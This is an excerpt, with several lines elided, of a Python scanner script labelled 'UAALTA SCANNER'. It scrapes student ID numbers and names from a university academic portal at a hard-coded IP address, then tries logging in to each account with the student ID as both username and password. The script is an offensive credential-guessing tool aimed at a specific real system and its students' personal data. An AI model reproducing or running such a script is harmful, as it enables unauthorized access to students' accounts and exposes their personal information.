...
bn = f"\r{flag}UAALTA SCANNER{white}|{green} B {cyan}E {yellow}T {white}A{off}\n"

def acd(usr, pwd):
    url = 'http://124.40.251.214/akademik/mandiri/'
    dat = {'user_id':usr,  'password':pwd, 
     'submit':'submit'}
        ...
        if akses != 200:
            ...
            if inv == '1':
                ...
                for i in range(len(resp)):
                    ...
                    tab = bs(stat, 'html.parser').find_all('table')[0].find_all('tr')[1:]
                    for x in range(len(tab)):
                        nim = tab[x].find_all('td')[1].get_text().replace(' ', '')
                        nama = tab[x].find_all('td')[2].get_text().replace(' ', '.').lower()
                        try:
                            acd(nim, nim)
                        except:
                            acd(nim, nim)
